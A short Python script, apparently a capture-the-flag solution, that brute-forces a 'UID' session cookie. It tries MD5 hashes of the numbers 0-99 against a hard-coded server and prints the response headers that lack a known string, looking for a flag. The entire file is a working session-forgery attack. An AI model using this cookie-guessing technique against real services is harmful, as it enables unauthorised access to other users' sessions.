import requests
import hashlib

session = requests.Session()

for word in range(0, 100):
    session.cookies['UID'] = hashlib.md5(str(word).encode("utf-8")).hexdigest()
    r = session.get("http://104.154.106.182:8080/")
    
    # Flag?
    if not "y0u_c4nt_U53_m3" in str(r.headers):
        print(r.headers)


